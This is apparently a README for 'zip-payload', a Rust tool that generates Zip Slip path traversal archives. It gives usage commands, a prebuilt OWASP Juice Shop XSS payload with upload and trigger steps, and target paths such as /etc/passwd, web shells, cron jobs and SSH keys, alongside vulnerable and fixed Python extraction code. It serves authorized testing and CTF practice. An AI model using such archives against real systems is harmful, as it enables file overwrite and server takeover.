# zip-payload

Zip Slip payload generator for path traversal attacks.

## Installation

```bash
cargo build --release
# Binary: target/release/zip-payload
```

## Usage

### Create Custom Payload

```bash
zip-payload create -o exploit.zip -t "../../etc/passwd" -c "malicious content"
```

Options:
- `-o, --output`: Output zip file path [default: exploit.zip]
- `-t, --target`: Target path with path traversal
- `-c, --content`: Content to write to the file

### Juice Shop Video XSS

Generate payload for the Juice Shop Video XSS challenge:

```bash
zip-payload juice-shop -o exploit.zip
```

Output:
```
[*] Creating Juice Shop Video XSS payload...
    Target: ../../assets/public/videos/owasp_promo.vtt
[+] Created: exploit.zip (256 bytes)

Next steps:
1. Upload to http://localhost:3000/#/complain
2. Check: curl http://localhost:3000/assets/public/videos/owasp_promo.vtt
3. Trigger: http://localhost:3000/promotion
```

### List Common Targets

```bash
zip-payload list
```

Shows common Zip Slip targets:
- Web shells
- Config files
- Cron jobs
- SSH keys

## How Zip Slip Works

1. **Malicious Archive**: Create a ZIP with entries containing `../` sequences
2. **Extraction**: When extracted, files are written outside the intended directory
3. **Impact**: Can overwrite critical files, deploy web shells, etc.

Example malicious path:
```
../../../var/www/html/shell.php
```

## Defense Measures

Vulnerable code (Python):
```python
# VULNERABLE
with zipfile.ZipFile(upload) as z:
    z.extractall(extract_dir)
```

Safe code:
```python
# SAFE
with zipfile.ZipFile(upload) as z:
    for name in z.namelist():
        # Normalize and validate path
        target = os.path.normpath(os.path.join(extract_dir, name))
        if not target.startswith(extract_dir):
            raise ValueError("Path traversal detected")
        z.extract(name, extract_dir)
```

## Use Cases

### CTF Challenges
- Juice Shop Video XSS challenge
- File upload bypass challenges

### Security Testing
- Test zip extraction implementations
- Verify path traversal protections

## Warning

This tool is for authorized security testing only. Zip Slip attacks can:
- Overwrite system files
- Deploy malicious code
- Compromise servers

Only use against systems you have permission to test.
